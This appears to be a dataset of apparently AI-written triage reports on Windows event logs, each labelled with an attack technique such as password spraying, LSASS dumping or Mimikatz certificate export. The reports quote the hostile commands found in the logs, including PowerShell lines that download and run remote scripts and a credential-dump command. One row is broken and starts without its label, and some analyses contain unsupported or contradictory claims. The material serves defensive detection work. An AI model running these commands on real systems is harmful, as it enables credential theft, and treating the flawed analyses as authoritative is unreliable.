Password Spray (DomainPasswordSpray),"## Detailed Analysis of the Logs

### Suspicious or Anomalous Behavior
1. **PowerShell Activity (Potential Malicious Script Execution):**
   - There are several PowerShell logs that indicate the execution of a PowerShell script from an external source using the command:
     ```powershell
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); 
     Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force
     ```
   - The script appears to be a password spraying attack script. This is highly suspicious and indicative of malicious behavior as it involves downloading and executing a script that can potentially be used to compromise user accounts by attempting a dictionary attack.

2. **Abnormal Time Change Activity:**
   - In the System log, there are two events (EventID 4616) that show the system time being adjusted slightly backward, which could potentially be an attempt to evade detection mechanisms that rely on timestamps. While not directly malicious by itself, it can be suspicious.

3. **Privilege Escalation:**
   - Security logs show an EventID 4672, indicating ""Special privileges assigned to new logon"" for the user ""admin_test"", who was granted permissions such as SeDebugPrivilege and SeImpersonatePrivilege. This event by itself is standard for admin accounts, but in the context of abnormal behavior (such as executing a password spraying script), it could indicate potential privilege misuse.

4. **Multiple ""wevtutil.exe"" Executions:**
   - Sysmon logs show repeated execution of ""wevtutil.exe"", indicating that someone might be managing or exporting event logs. This could be seen as an attempt to cover tracks. While ""wevtutil.exe"" usage can be normal, frequent instances around the suspicious PowerShell activity timeframe raise concerns.

### Malicious Activity or Compromise
- The PowerShell execution of a potentially malicious script indicates a strong potential compromise. Running scripts from unknown and unverified external sources poses a high risk of system compromise.
- Usage of security-focused PowerShell commands to perform network-wide operations like password spraying under the 'admin_test' account, which was seen with elevated privileges, is characteristic of unauthorized access attempts.

### Threats or Risks Identified
- **Credential Compromise Risk:** Password spraying attacks are designed to compromise credentials and potentially gain further unauthorized access across the organization.
- **Data Exfiltration or Modification:** If the attack is successful, there is a high risk of sensitive data being accessed, modified, or exfiltrated.
- **System Integrity Compromise:** The execution of untrusted scripts can lead to the installation of backdoors or malware, further compromising system integrity.

## Guidance and Resolution

Given the noted activities, there is clear evidence of potentially malicious intent and execution:

- **Resolution:** MALICIOUS

### Recommendations:
1. **Immediate Isolation of the Host:**
   - Disconnect the affected host from the network to prevent further spread of any potential attack.

2. **Credential Resets:**
   - Initiate a password reset for the 'admin_test' account and any other accounts that may have been targeted or compromised.
   
3. **Forensic Investigation:**
   - Conduct a full forensic investigation to understand the extent of the compromise and identify potential persistence mechanisms or additional compromised hosts in the network.

4. **Security Enhancements:**
   - Implement network security monitoring to detect abnormal behavior indicative of lateral movement or further password spraying attempts.
   - Review and harden PowerShell execution policies and consider implementing AppLocker or Windows Defender Application Control to prevent execution of untrusted scripts.

5. **User Awareness Training:**
   - Conduct training sessions emphasizing the dangers of executing or downloading scripts from untrusted locations.

6. **Log and Alert Review:**
   - Enhance logging and alerting mechanisms for similar suspicious activities to ensure quicker detection and response in the future."
Rubeus kerberoast,"The provided Windows event logs for the machine, identified as ""Server002,"" reveal several activities that warrant analysis. I'll address these in terms of suspicious behavior, potential malicious activity, and resolution.

### Analysis of Suspicious Activities:

1. **PowerShell Activity**:
   - Multiple PowerShell logs indicate the execution of a command combining PowerShell, `cmd.exe`, and running an external script located in a temporary directory.
   - The command line in the logs: `powershell.exe & {klist purge, cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\"" script /outfile:\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script_output.txt\""}`
   - Execution of external scripts from a temporary location could be indicative of a malicious payload, primarily when combined with `cmd.exe` usage.

2. **Sysmon Logs**:
   - Repeated activation of `wevtutil.exe` and `conhost.exe` under the user ""SERVER002\\admin_test,"" shortly followed by PowerShell activity, suggests automated or scripted tasks possibly used to tamper with event logs or system data.
   - The `klist.exe` command purging Kerberos tickets might be indicative of an attempt to evade detection or reset authentication sessions.
   - The presence of the script execution in Sysmon logs corroborates the PowerShell activity, showing that the file `script.exe` was indeed executed.

3. **Execution of External Scripts**:
   - The execution path and commands associated with `script.exe` appear suspicious due to their location and nature of execution.
   - Temporary directories and ambiguous paths (e.g., `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles`) are often utilized by malicious actors to bypass traditional monitoring and security layers.

4. **Potential Legitimate Software Updates**:
   - The logs include records of Microsoft Edge Update activities, which seem legitimate as part of routine software updates. These are executed under the NT AUTHORITY\SYSTEM context, which is standard for system-level updates.

### Assessment of Threats and Risks:

- The PowerShell execution and surrounding context suggest possible malicious activity or compromise, primarily due to external script execution and credential manipulation (`klist purge`).
- The regular Windows Defender logs showing ""SECURITY_PRODUCT_STATE_ON"" suggest antivirus was operational, but the actions detected could bypass standard defenses.

### Guidance and Resolution:

1. **Further Investigation**:
   - Review the contents and origin of `script.exe` for any indicators of compromise or malicious payloads.
   - Inspect system logs for additional context around who initiated the PowerShell script commands and any network connections associated.

2. **Incident Mitigation**:
   - Conduct a full system scan using updated threat intelligence to detect any anomalies or malware artifacts not yet identified.
   - If malicious activities are confirmed, isolate the host, analyze memory and disk for forensic traces, and contemplate broader network scans to detect similar patterns elsewhere.

3. **User Awareness**:
   - Re-educate privileged users (like admins) on avoiding execution of scripts from unknown or unauthorized sources, particularly in temporary directories.

**Final Resolution: SUSPICIOUS**

The logs primarily exhibit suspicious behavior that merits further investigation to conclusively determine whether they are benign or malicious. The combination of scripting, temporary file execution, and potential credential clearing actions suggests a heightened risk requiring thorough investigation."
Extract Windows Credential Manager via VBA,"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behavior Observed:

1. **PowerShell Activity**:
   - Multiple PowerShell events show the execution of a suspicious script from the internet (""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"") using the `Invoke-WebRequest` (iwr) method. This is executed with `Invoke-Expression` (IEX), which is often associated with malware delivery and execution. 
   - The command executed is:
     ```
     powershell.exe & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     IEX (iwr ""https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1"" -UseBasicParsing)
     Invoke-script -macroFile ""...data-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""}
     ```
   - This pattern of behavior, particularly the use of `IEX` and fetching scripts from URLs, is frequently observed in malicious PowerShell activity and can potentially signify an attempt to execute unauthorized code on the system.

2. **System Log Time Alteration**:
   - The system logs show two instances where the system time was adjusted backward, as seen from:
     - Event ID 4616 in Security log and Event ID 1 in System log. Adjusting system time backward is uncommon in legitimate scenarios and could indicate an attempt to manipulate logs or schedule tasks to execute at unsanctioned times without arousing suspicion.

3. **Edge Update Executions**:
   - There are numerous entries related to EdgeUpdate.exe, executing with various command line arguments like `/svc`, and `/ua`, under NT AUTHORITY\SYSTEM account. While Microsoft Edge updates are legitimate, the heavy, rapid sequence of these processes and interactions seems out of the ordinary and raises questions about whether this could be leveraged as a persistence mechanism by malware.
  
#### Conclusion of Malicious Activity or Compromise:

Based on the PowerShell command execution downloading and running scripts from an external site, along with suspicious system time manipulation and unusual EdgeUpdate.exe process activity, there are significant indicators of potential compromise.

### Final Assessment:
**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Isolation**: Immediately isolate the affected endpoint (Server002) from the network to prevent further propagation of potential malware.

2. **Detailed Analysis**: Conduct a thorough forensic analysis on the device to identify any malicious payloads that might have been installed due to the PowerShell script execution.

3. **IOC Sharing**: Prepare and share indicators of compromise derived from the PowerShell script URL and any detected payloads with relevant teams to enhance future detection.

4. **Review and Block**: Review firewall and proxy logs to block any suspicious outbound connections similar to the one noted in the logs. Implement URL filtering to prevent future access to known malicious sites.

5. **System Time Audit**: Review and monitor the audit trail for any future unauthorized time changes, as this could be leveraged to bypass time-based security measures or log times.

6. **Patch Management**: Ensure that all systems are up-to-date with the latest patches, especially security patches for browsers and their update mechanisms.

7. **Awareness Training**: Conduct security awareness sessions for users to recognize and report suspicious activities, such as unexpected PowerShell execution and unauthorized script downloads. 

By following these steps, you can limit damage from the detected threat and bolster defense against similar future threats."
Dump LSASS.exe using imported Microsoft DLLs,"### Detailed Analysis of the Logs

#### Overview

The logs analyzed are primarily from Sysmon and Windows PowerShell logs from Server002, which is being accessed using the user account `SERVER002\admin_test`. The specific sequence of events indicates potentially malicious activity, especially when PowerShell is involved in executing processes that interact with system memory.

#### Suspicious or Anomalous Behavior

1. **PowerShell Execution**:
   - The Sysmon logs show multiple instances of `powershell.exe` being executed (`Event ID 1`). Notably, one execution includes a specific command:
     ```
     ""powershell.exe"" & {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.data.001.dmp -x 0x41}
     ```
   - This command is highly suspicious. `xordump.exe` is used here to create a memory dump of the `lsass` process. `lsass` (Local Security Authority Subsystem Service) stores sensitive information like user password hashes and can be targeted to extract credentials illicitly.

2. **Processes Related to `xordump`**:
   - The use of a third-party executable (`xordump.exe`) executing within a PowerShell context and targeting `lsass` is a significant indicator of potentially malicious activity. Memory dumping of `lsass` is a known technique used in credential dumping attacks.

3. **High Integrity Level**:
   - The PowerShell executions and related commands are executed under a High Integrity Level, indicating administrative privileges, which are needed to perform sensitive operations like dumping memory.

4. **Frequent Executions**:
   - There are a series of rapid, back-to-back executions of other system utilities like `wevtutil.exe` and `conhost.exe`, but no direct malicious command usage from these logs, thus possibly serving as camouflage or part of automated scripting activity.

5. **Absence of Legitimate Administrative Context**:
   - There is no information suggesting these actions were part of any legitimate administrative tasks. Typically, extensive logging and credential manipulation via PowerShell would be documented or cleared by IT administration.

#### Log Assessment

Based on the above observations and understanding of typical attack vectors involving PowerShell and credential access, the events identified point strongly toward:

- **Malicious Activity**: The command involving `xordump` and PowerShell is atypical of legitimate administrative operations. They suggest potential credential harvesting, intending to steal sensitive information from the system.

### Resolution

**Resolution: MALICIOUS**

#### Guidance on How to Proceed

1. **Immediate Containment**:
   - Isolate the affected host (Server002) from the network to prevent lateral movement.
   - Conduct a complete memory and disk forensic analysis of the affected system to look for further indicators of compromise.
   
2. **Credential Auditing**:
   - Force reset passwords for accounts that accessed the server, especially `SERVER002\admin_test`.
   - Audit recent logins and accesses for unusual patterns.

3. **Incident Response Team**:
   - Activate the incident response plan involving IT security team to handle, investigate, and contain the breach.
   - Monitor network traffic for any unusual outgoing connections that might indicate exfiltration attempts.

4. **Review and Strengthen Security Posture**:
   - Conduct a security policy review ensuring the least privilege principle is enforced consistently.
   - Investigate other systems for similar patterns or indicators of compromise.
   - Update alert thresholds for PowerShell and potentially harmful executables on the EDR system. 

These steps should ensure that compromise damage is minimized and future security posture is strengthened."

   - Multiple instances of system utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` executed in rapid succession by the user `SERVER002\admin_test`.
   - Particularly, `wevtutil.exe` and `conhost.exe` are prevalent, which could indicate normal administrative tasks, but their frequency and timing are worth noting.

2. **PowerShell Execution:**
   - A PowerShell script was executed that appears to attempt credential brute forcing against AzureAD with credentials belonging to `bruce.wayne@contoso.com`.
   - The script iterates through a list of passwords trying to authenticate, indicating a possible credential attack.
   - This is clear malicious behavior as it demonstrates an automated attempt to compromise an account through password guessing.

3. **High Integrity Processes:**
   - Processes executed with `High` integrity level, indicating they were run with elevated privileges, possibly as an administrator.
   
4. **Windows Update and System Communication:**
   - Numerous updates through Windows Update Client were logged, which looks like routine system updates and appear to be timestamps around the execution of suspicious PowerShell scripts.
   - Though these are expected activities, the concurrent execution of PowerShell scripts could infer an attempt to mask malicious activities amidst regular operations.

**Assessment:**
- The presence of an automated script attempting credential brute force login attempts against `AzureAD` confirms malicious intentions.
- Execution of system utilities alongside credential brute force indicates a breach attempt or compromise aiming at privilege escalation or lateral movement within the network.

**Resolution:**
- **MALICIOUS**: The pattern of activities, especially the brute force attack using PowerShell, unmistakably points to a serious security concern.

**Guidance:**
1. Immediately isolate the affected host `Server002` to prevent further unauthorized access or lateral movement.
2. Initiate a comprehensive forensic investigation to identify the scope of the breach and any potential data exfiltration.
3. Change and secure all potentially compromised credentials, paying special attention to admin and privileged accounts.
4. Review and enhance security controls, such as implementing multi-factor authentication (MFA), enforcing stronger password policies, and setting up alerts for suspicious login attempts.
5. Brief the security team and relevant stakeholders about the incident to ensure all are aware and can coordinate a unified response.
6. Consider a security awareness refresh or training for administrative staff focusing on recognizing and reporting unusual system activities."
Export Certificates with Mimikatz,"Upon reviewing the logs provided, I have conducted a detailed analysis focusing on any signs of malicious activity. Here's the breakdown of my findings:

### Analysis of Logs:

#### **Application Log:**
- **Software Protection Platform Service (Event ID 16384)**: This entry shows routine activities related to the Windows Software Protection Platform. It does not indicate any malicious activity.
- **SecurityCenter Events (Event ID 15)**: These indicate the Windows Defender is on and active, which is normal and expected behavior.

#### **Sysmon Log:**
- **Process Execution**:
  - **PowerShell.exe Execution**: Powershell is a commonly exploited utility on Windows systems when compromised. However, without command-line arguments or additional context showing misuse, the execution is not immediately suspicious.
  - **wevtutil.exe Execution**: This utility is used to manage event logs, and its frequent execution might indicate log tampering or auditing by an administrator. This is potentially suspicious unless the context of use is verified.
  - **cmd.exe Execution with Suspicious Command-Line Argument**: The command `/c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\x64\script.exe"" ""crypto::certificates /systemstore:local_machine /store:my /export"" exit` suggests potential malicious data extraction activities, especially due to its execution from a temporary directory and involvement of certificates.
  - **HOSTNAME.EXE, whoami.exe, and conhost.exe Executions**: Common Windows utilities executed without context that suggests immediate concern.
  - **sppsvc.exe, TrustedInstaller.exe, and TiWorker.exe**: These are standard Windows services running under network or system authority. Their presence alone is normal.

### Conclusions:

1. **Anomalous Behavior**: 
   - **Execution of cmd.exe with a specific script**: The command-line arguments suggest data export activities, which is suspicious. The execution from the Temp directory is particularly concerning and indicative of potential compromise or penetration testing.

2. **Indicators of Potential Compromise**:
   - **Cmd.exe and wevtutil.exe Usage**: The specific use of `cmd.exe` to run a script from the Temp directory with commands related to certificate extraction could imply unauthorized data exfiltration. The frequent execution of `wevtutil.exe` could suggest an attempt to tamper with event logs or evade detection, which requires further investigation to ensure it is a legitimate administrative action.

### Resolution:

- **Resolution**: SUSPICIOUS

### Recommendations:

- **Further Investigation**: Immediate steps should be taken to investigate the context around the execution of the `cmd.exe` command. Determine whether the script executed is part of routine operations or if it was introduced by a third party. Investigate the legitimacy of `wevtutil.exe` executions and whether changes to event logs occurred.
- **Forensic Review**: Conduct a more thorough forensic analysis of the TEMP directory to ascertain the contents of the `script.exe` file and review PowerShell execution history for any abnormal usage.
- **Monitoring**: Enable enhanced monitoring for this host, particularly focused on file access to sensitive directories and command-line executions by non-administrative processes.
- **User Verification**: Verify the role and recent activities of the `admin_test` user to ensure account integrity and rectify any unauthorized access issues.

This analysis suggests a concerning behavior pattern that merits closer scrutiny to rule out or confirm the presence and scope of a security incident."
Crafting Active Directory silver tickets with mimikatz,"Upon analyzing the provided Windows event logs, here's a detailed assessment focusing on identifying any suspicious or anomalous behaviors that may indicate malicious activity:

### Suspicious or Anomalous Behaviors Noted:

1. **Cmd.exe Execution**:
    - The execution of `cmd.exe` with the command line: 
     ```
     ""C:\\Windows\\system32\\cmd.exe"" /c echo C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script\\x64\\script.exe
     ```
    - This command involves the use of `echo` to presumably check for the existence of a specific script in a potentially obfuscated manner. While not directly malicious, such indirect references to scripts located in temporary directories can sometimes be associated with malicious intentions or attempts to execute additional payloads.

2. **High Integrity Level Execution**:
    - Several processes, including PowerShell and `cmd.exe`, executed with a high integrity level. This indicates elevated privileges, which could potentially be abused for malicious activities without proper justification. 

3. **Repeated Execution of `wevtutil.exe`**:
    - The frequent triggering of `wevtutil.exe` (Windows Events Command Utility) by the user `SERVER002\\admin_test` might indicate attempts to manipulate or query event logs, which is sometimes an indicator of logs manipulation—a common tactic used for evasion of detection.

4. **Windows PowerShell Execution**:
    - The presence of PowerShell processes indicates possible script execution, potentially download or execution of scripts directly affecting the system. 

5. **SHA256 Hash Mismatch**:
   - Usage of different file names like `hostname.exe`, `whoami.exe`, and their genuine SHA256 hashes are not highly suspicious but require validation against known good hashes to ascertain authenticity.

6. **Microsoft Edge Update Executions**:
   - Multiple `MicrosoftEdgeUpdate` processes executed from various directories. While a legitimate service, its abusive or unsigned execution could represent an attempt at persistence or stealthy execution of unwanted software.

7. **Logon Events**:
   - Several logon events (`Event ID 4624`) by SYSTEM user across the system without associated remote logon which should be scrutinized to ensure procedural consistency in system tasks and no undue privilege escalations.

### Threats or Risks Identified:

- **Potential Malicious Script Execution**:
  The command involving echoing a path to a script suggests careful attention should be given to whether this script contained any harmful instructions executed thereafter.
  
- **Log Manipulation/Dodging**:
  Due to usage of `wevtutil.exe`, there's a probable risk of attack-related activities being cloaked from traditional logging, making detection through log analysis challenging.
  
- **Privilege Abuse**:
  High integrity processes being run for seemingly non-administrative tasks may suggest either a misconfiguration or an abuse situation needing further containment and analysis.

### Recommended Guidance:

1. **Conduct a Thorough Review**:
   - Review all scripts that were executed through PowerShell and cmd to ensure they align with known authorized activities. Pay particular attention to the context under which they were executed.

2. **Ensure Hash Verification**:
   - Cross-verify the SHA256 hashes of crucial executables with known good values to rule out potentially malicious file replacements.

3. **Elicit Endpoint Detection Tool Examination**:
   - Engage Endpoint Detection and Response (EDR) tools to retrospectively analyze for anomalous patterns correlating with network or file activities around the time of these executions.

4. **Enhanced Monitoring**:
   - Implement enhanced monitoring around PowerShell and advanced logging with Event ID 4688 to gain transparency into future scripts' interactions on system processes.

### Resolution Assessment:
Given the evidence at hand, combining the fact that there is unusual usage of tools commonly employed in malicious activities and paths that might infer further risk, the situation is tentatively evaluated as:
   
**SUSPICIOUS** - Activity warrants more investigation to ascertain whether it is legitimately aligned with organizational IT activities or unauthorized/malicious interventions. Further forensic measures are prudent to determine maliciousness conclusively.

### Final Resolution: SUSPICIOUS

The logs require ongoing probing into logs and surrounding activities to either dispel or confirm malicious motives conclusively."
Credential Dumping with NPPSpy,"### Analysis of Logs:

Upon reviewing the provided logs, several indicators of potentially malicious activity have been identified:

1. **PowerShell Activity:**
   - There are multiple PowerShell events (Event ID 600) that involve the execution of a PowerShell script containing actions that could be indicative of post-exploitation activities. 
   - The script copies a DLL (`script.dll`) from a temporary directory to `C:\Windows\System32`, modifies the registry to include the ""script"" in the `ProviderOrder`, and sets registry entries under `Services\script\NetworkProvider`.
   - The PowerShell script ends with an echo statement suggesting that cleartext passwords will be stored in a file (`C:\script.txt`) upon user logout and login.

2. **Registry Modification:**
   - The script modifies the registry values under `HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`, which could be indicative of an attempt to persist in the system by masquerading as a network provider.
   - New registry keys are created under `HKLM:\SYSTEM\CurrentControlSet\Services\script\NetworkProvider` to set up a potentially malicious service.

3. **Intent to Harvest Credentials:**
   - The script explicitly mentions the storage of cleartext passwords in `C:\script.txt`, which is a strong indication that credential harvesting is being attempted.

4. **Sysmon Activity:**
   - There are several Sysmon events (Event ID 1) registering the execution of `powershell.exe` with suspicious command lines, as previously described. The use of high integrity level and system directory paths suggests unauthorized or elevated access.
   - Other processes such as `conhost.exe` and `wevtutil.exe` appear around the same time, likely used to manipulate the command prompt or edit event logs, respectively.

### Assessment of the Situation:

The behavior documented in the logs strongly indicates malicious activity. The PowerShell script execution, registry modifications for persistence, and intentions to gather cleartext passwords highlight this as a compromise scenario. The activities appear to be part of a post-exploitation routine, potentially related to a trojan or backdoor installation.

### Identified Threats or Risks:

- **System Compromise:** The host in question is likely compromised, given the unauthorized and suspicious activities recorded.
- **Credential Harvesting:** There is a clear threat of credential harvesting, which could lead to further unauthorized access or lateral movement within the network.
- **Persistence Mechanisms:** Registry modifications suggest attempts at maintaining persistence on the system post-exploitation.

### Guidance on How to Proceed:

1. **Immediate Isolation:** Isolate the host (Server002) from the network to prevent any further execution of the malicious activities or spread to other systems.
2. **Incident Response Initiatives:** Initiate full incident response procedures to analyze the compromise, determine the initial vector, and understand the full impact of the breach.
3. **Forensic Analysis:** Conduct a detailed forensic analysis of the system to recover potential indicators of compromise (IOCs), analyze scripts or files involved, and identify any other backdoors or malware present.
4. **Credential Reset:** As credential harvesting is suspected, initiate resets of all accounts that may have been accessed from this host.
5. **Re-image the System:** Consider re-imaging the system to remove any traces of the compromise fully.

### Resolution:

Based on the evidence analyzed, the resolution for this situation is:

- **MALICIOUS** - The logs contain definitive evidence of malicious activity."
Brute Force:Credential Stuffing using Kerbrute Tool,"Based on a detailed analysis of the provided Windows event logs, I can make the following observations about the activity on the Windows host, specifically the machine named ""Server002"":

### Observations and Analysis:

1. **PowerShell Activity:**
   - Multiple instances of PowerShell execution are noted in the logs, particularly with a command that involves a script labeled `script.exe` located within a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\`). The script is executed with `bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain` parameters and references a `bruteforce.txt` file.
   - This type of operation, especially with terms like ""bruteforce"" often correlates with potential malicious activity such as password cracking or unauthorized access attempts.

2. **Sysmon Logs Indicating Suspicious Execution:**
   - The Sysmon logs record the spawning of multiple processes including `wevtutil.exe` (Windows Event Log utility) and `whoami.exe` which can correlate with attempts to pivot or escalate privileges by a script.
   - Additionally, there are entries related to `HOSTNAME.EXE` and `wsmprovhost.exe`, which are legitimate but can be abused in nefarious scenarios.

3. **Monitoring Events and Service Activities:**
   - The application logs reveal that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`) despite the suspicious activity, indicating some level of protection on the system.
   - Several Edge-related updates and service activities are normal but the repeated stopping of the EdgeUpdate service without a subsequent start can be considered unusual, dependent on context.

4. **Security Logs and Credential Access:**
   - Multiple `EventID 5379` entries in the security log record attempts to access credentials, all of which are returned with a specific error code (`3221226021`), indicating that the attempts likely did not successfully acquire credentials. This could reflect failed brute force or unauthorized access attempts.

### Conclusion and Risk Assessment:

Considering the above points:

- The presence of a PowerShell script executing with parameters mentioning ""bruteforce"" is highly suspicious and unlikely to be legitimate activity on a CEO’s machine or any corporate asset unless explicitly approved for security testing purposes.
- There was no direct evidence of successful exploitation or unauthorized access completion, but there remains a significant risk of attempted compromise or further malicious activity.
- `wevtutil.exe` usage to export logs can also correlate with attempts to cover tracks or analyze security events for weak points.

### Recommended Actions:

1. **Immediate Resolution:**
   - Terminate the suspicious PowerShell and `script.exe` activity immediately if currently active.
   - Investigate the source and permissions of the `script.exe` file and validate its authenticity.

2. **Forensic Analysis and Response:**
   - Conduct a full forensic analysis of the affected machine, specifically checking for any unauthorized changes or data exfiltration activities.
   - Review and confirm all recent activity by the `SERVER002\\admin_test` account.

3. **Enhancing Security Measures:**
   - Implement stricter PowerShell execution policies and ensure all scripts are signed and verified.
   - Strengthen monitoring of administrative accounts and logs for high integrity-level processes.

Based on the evidence and context, I classify this situation as **MALICIOUS**, warranting immediate and thorough investigation, and response actions to avert potential security breaches or damage."
LSASS read with pypykatz,"### Analysis of Logs

#### Sysmon Log Observations
1. **Powershell Activity**:
   - There is a Sysmon EventID 5 indicating process creation for `powershell.exe` executed by user `SERVER002\admin_test`. Frequent use of PowerShell without corresponding legitimate tasks could indicate script execution for reconnaissance or payload delivery.

2. **Wevtutil Usage**:
   - Repeated execution of `wevtutil.exe` is noted. This tool is typically used for managing event logs and can be potentially manipulated for log clearing, which is suspicious behavior when observed without obvious reason.

3. **Hostname and Whoami Execution**:
   - Both `hostname.exe` and `whoami.exe` executions are observed. These tools could be executed by an attacker to gain basic information about the system and user context.

4. **Command Line Activity**:
   - Notably, there is an execution of `cmd.exe` with the following command line: `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\venv_data_001\\Scripts\\script"" live lsa`. 
     - This indicates a script executing potentially sensitive operations, flagged by the presence of `lsa`, which might relate to accessing the Local Security Authority (LSA) or secrets within a script.

5. **High Integrity Level**:
   - The processes are executed with a high integrity level, giving them enhanced privileges, posing a risk if initiated by unauthorized users or scripts.

#### Assessment
The combination of PowerShell and `wevtutil.exe` usage without a legitimate reason, coupled with `cmd.exe` executing scripts related to potentially sensitive tasks, suggests potentially unauthorized or malicious behavior. This system appears to have a user (`SERVER002\admin_test`) running a series of high-privilege commands that align with common techniques used in attacks, especially those related to privilege escalation or data reconnaissance.

### Conclusion
- **Resolution: SUSPICIOUS**

The activity captured in the logs indicates suspicious behavior, warranting further investigation. The repeated use of system utilities such as `wevtutil` and `PowerShell`, combined with the execution of potentially sensitive scripts using `cmd.exe`, particularly under high integrity levels, is concerning. These actions could signify an attempt to gather information, potentially with malicious intent.

### Recommended Actions
- **Immediate Investigation**:
  - Conduct a thorough investigation of the user `SERVER002\admin_test` activities on the network, reviewing access rights and processes initiated by this user.
  - Audit and restrict the use of PowerShell, `wevtutil`, and other administrative tools.
  - Review the script executed from `C:\Users\ADMIN_~1\AppData\Local\Temp\`, focusing on its contents and origin.
  
- **Monitoring**:
  - Increase monitoring of similar activities across other systems to determine if this behavior is isolated or part of a coordinated effort.
  
- **Incident Response**:
  - If further investigation confirms unauthorized access or activity, initiate incident response procedures, including system isolation, forensic analysis, and potentially involving law enforcement if needed."
Cached Credential Dump via Cmdkey,"### Detailed Analysis of the Logs

#### System Log
- **Events 44, 43, and 19:** These entries are related to routine security updates by Microsoft Defender Antivirus. The updates seem standard and indicate routine operations for updating security definitions. No anomalies observed.

#### Application Log
- **Event ID 15:** The log entry confirms that Windows Defender is operational (`SECURITY_PRODUCT_STATE_ON`). This is a benign indication that security features are functioning correctly on the system.

#### Security Log
- **Event IDs 4634, 4672, 4624:** These logs indicate a logoff (`4634`) and subsequent logins (`4624`) with elevated privileges (`4672`) using NTLM authentication from the user `admin_test`. This user session has a high privilege level which includes `SeDebugPrivilege`. While possessing these privileges itself is not uncommon for admin accounts, logging in with these privileges should be vetted in context for potential misuse.
- **Event IDs 5379:** This type of event indicates processes related to credential management with return codes signifying failed credential operations. The repeated failed operations might suggest probing for sensitive information or repeated errors that could benefit from further investigation. However, they are not definitive indicators of compromise in themselves.

#### Sysmon Log
- **General Process Activity:**
  - **Processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `hostname.exe`, and `cmdkey.exe`:** These are legitimate system utilities and are typically used in both administrative and potentially malicious scenarios to gather information about the system or perform system operations.
  - **Process Hierarchies and Commands:**
    - `CMD`: Used with `cmdkey /list` which could be probing for saved credentials.
    - `wevtutil.exe`: Used for event log management, potentially by an administrator to fetch logs.
    - The use of `cmdkey`, `whoami`, and `hostname` suggest attempts to gather credentials and user account information.
  
- **Processes executed as SYSTEM:**
  - These include `taskhostw.exe`, `wuauclt.exe`, `MsEdgeUpdate.exe`, indicating routine automated system maintenance processes such as task handling, updates, etc., under System integrity levels.

### Assessment of the Situation

There are several activities in the logs that merit further exploration, notably:
1. The use of `cmdkey` which could indicate attempts to view stored credentials. This may signal malicious intent if not corroborated with legitimate administrative activity.
2. Administrative-level logins and privilege assignment to `admin_test`, especially with debug privileges, which could be normal for this user role but should always be verified for legitimacy.

The operations, however, do not conclusively point to active exploitations or infections but do show atypical administrative behavior especially around credential and privilege management.

### Threats/Risks Identified
- Potential credential access and misuse if `cmdkey` was not legitimately employed.
- Administrative privileges being used for actions that don't have clear legitimate purposes.

### Guidance on How to Proceed
- Verify with the user/admin `admin_test` for the legitimacy of these actions, especially surrounding `cmdkey` execution and the need for granting extensive privileges.
- Review any additional logs and alert triggers nearby this timeframe to determine if this activity is part of a larger issue.

### Conclusion

**Resolution:** SUSPICIOUS

The activity within the logs contains patterns that do not align with typical user behavior without further explanation. This warrants additional investigation to rule out malicious intent or confirm benign administrative tasks."
WinPwn - SessionGopher,"Based on the thorough analysis of the provided event logs, several key observations can be made:

### System Log:
1. **Time Change Events**: There are events indicating changes in the system time. These are logged by the Kernel-General provider and also seen in the Security log. The time changes are processed by `svchost.exe`, which is standard behavior for system time adjustments.

### Application Log:
2. **Windows Defender**: Windows Defender indicates that it is active, showing no signs of being disabled or tampered with.
3. **EdgeUpdate Service**: The service starting and stopping is logged, which typically indicates routine update processes but should be checked for alignment with official update schedules.

### PowerShell Log:
4. **Suspicious PowerShell Activity**: PowerShell logs indicate execution of scripts pulled from an external source (a GitHub repository). The command involves downloading and executing a PowerShell script. This behavior can be associated with a potential security risk or compromise as it involves executing code from an unverified remote location.

### Sysmon Log:
5. **Process Activity**: There is routine activity logged for processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and others. Notably, a suspicious call of `powershell.exe` is observed which matches the PowerShell log and further supports potential malicious activity.
6. **EdgeUpdate Execution**: A significant number of entries pertain to the execution of `MicrosoftEdgeUpdate.exe` and related processes, indicating an update operation which could be normal if aligned with a legitimate update schedule.

### Security Log:
7. **Further Time Change Events**: Confirming that these events were logged by the Security-Auditing provider.

### Assessment and Conclusion:
- **BENIGN** activity is observed with time-changing events and Windows Defender's status.
- **SUSPICIOUS** behavior is noted primarily due to the PowerShell logs showing a remote script execution attempt. This aligns with a classic method attackers use to introduce scripts into an environment.
  
### Resolution:
**SUSPICIOUS** - The signs of remote script execution necessitate a deeper investigation. The system should be scanned for any new executables or activities that were not initiated by the user or IT department. Log correlation and historical analysis should be applied to determine if any unauthorized access or data exfiltration occurred. It is also recommended to verify if the GitHub repository is trusted or associated with any known scripts/Pentesting tools.

### Guidance on Proceeding:
1. **Containment**: Isolate the machine to prevent further potential script execution or spread.
2. **Threat Hunting**: Conduct a detailed investigation to look for further Indicators of Compromise (IoCs) across other systems in the network.
